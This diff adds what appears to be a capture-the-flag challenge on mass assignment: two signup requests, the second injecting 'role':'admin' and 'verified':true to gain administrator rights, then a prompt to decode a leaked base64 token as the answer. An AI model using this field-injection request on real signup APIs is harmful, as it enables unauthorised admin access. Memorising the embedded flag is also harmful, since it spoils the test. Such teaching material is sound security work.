@@ -1,0 +1,18 @@
+Two registration attempts against the same signup API.
+
+--- Attempt 1: a normal signup (only the fields the form shows) ---
+  POST /api/register
+  {"username":"tester","password":"hunter2"}
+  201 Created  {"id":57,"username":"tester","role":"user"}
+
+--- Attempt 2: the attacker adds fields the form never offered ---
+  POST /api/register
+  {"username":"sneaky","password":"hunter2","role":"admin","verified":true}
+  201 Created  {"id":58,"username":"sneaky","role":"admin","verified":true,
+                 "admin_welcome":{"panel_token":"bWFzc19hc3NpZ25tZW50X3dpbg=="}}
+
+The backend blindly bound EVERY field in the JSON body onto the new user
+record (mass assignment / auto-binding), so simply adding role=admin made
+the account an administrator — and the response then leaked an admin-only
+welcome token. Decode that panel_token and submit the plaintext.
+Answer format: lowercase, words joined by underscores.
